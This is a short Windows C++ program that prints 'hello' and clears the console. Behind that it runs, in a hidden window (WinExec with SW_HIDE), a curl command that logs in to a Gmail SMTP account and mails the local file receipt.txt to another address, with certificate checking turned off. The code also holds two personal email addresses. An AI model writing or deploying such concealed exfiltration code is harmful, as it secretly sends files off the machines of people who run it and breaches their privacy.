#include <windows.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <iostream>
#include <ostream>
using namespace std;
int main(){
    char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"dhruvamalik2003@gmail.com\" --mail-rcpt \"dhruvamalik.05@gmail.com\" --ssl -u dhruvamalik2003@gmail.com:<ENTER PASSWORD HERE> -T \"receipt.txt\" -k --anyauth";
    WinExec(command, SW_HIDE);
    cout<<"hello"<<flush;
    system ("CLS");
    cout<<"hello"<<flush;
}




